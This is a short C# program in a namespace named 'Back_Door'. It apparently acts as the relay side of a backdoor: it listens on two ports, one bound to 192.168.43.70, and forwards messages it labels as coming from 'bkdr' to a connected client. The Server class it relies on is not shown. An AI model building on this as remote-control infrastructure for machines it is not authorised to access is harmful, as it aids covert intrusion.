using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;

namespace Back_Door
{
    class Program
    {
        static Server s;
        static Server intServer;

        static void Main(string[] args)
        {
            Set();

            
        }

        static void Set()
        {
            s = new Server();
            s.SetServer(1111);
            s.GetClientAsync();

            intServer=new Server();
            intServer.SetServer(new int[] {192,168, 43,70 },1112);
            intServer.GetClientAsync();


            while (intServer.Message == "")
            {
                Console.WriteLine("Running loop");
                if (intServer.client != null)
                {
                    Console.WriteLine("Waiting for message");
                    Redirect();
                }
                
            }

            
        }

        static void Redirect()
        {
            try
            {
                intServer.RecieveDataAsync(1024);
                while (intServer.Message == "") ;

                string msg = intServer.Message;
                intServer.Message = "";
                if (s.client != null)
                {
                    s.SendData(msg);
                }

                Console.WriteLine("Message from bkdr: " + msg);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                //intServer.client = null;
            }
            
        }

        static void DumpInfo()//object sender,DoWorkEventArgs e)
        {
            
            Console.WriteLine("Checking for message");
            Console.WriteLine();
            if (s.client != null)
            {
                s.SendData(intServer.Message);
                
            }
            intServer.Message = "";

        }
    }
}
